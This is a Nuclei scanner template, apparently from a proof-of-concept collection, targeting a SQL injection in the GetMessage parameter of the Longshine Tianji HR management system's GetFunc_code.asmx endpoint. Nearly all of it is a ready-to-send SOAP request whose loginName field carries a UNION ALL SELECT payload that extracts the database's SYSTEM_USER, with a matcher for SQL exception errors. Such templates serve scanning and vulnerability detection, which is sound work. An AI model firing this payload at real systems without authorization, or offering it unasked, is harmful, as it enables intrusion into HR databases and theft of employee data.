pocs/nuclei/lxtj-GetFunccode-sqli.yaml

id: lxtj-GetFunccode-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 朗新天霁人力资源管理系统GetFunc_code.asmx接口参数 GetMessage 存在SQL注入漏洞，导致数据泄露。
  reference:
    - https://github.com/wy876/POC/blob/1d1ffb9f40ef425e6558f039fb2296fe4a89b584/%E6%9C%97%E6%96%B0%E5%A4%A9%E9%9C%81%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FGetMessage%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /ws/GetFunc_code.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Content-Length: 433
        SOAPAction: "http://tempuri.org/GetMessage"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetMessage xmlns="http://tempuri.org/">
              <loginName>1' UNION ALL SELECT ISNULL(CAST(SYSTEM_USER AS NVARCHAR(4000)),CHAR(32))-- Bthm</loginName>
            </GetMessage>
          </soap:Body>
        </soap:Envelope>
    matchers:
      - type: word
        part: body
        words:
          - 'SqlClient.SqlException'
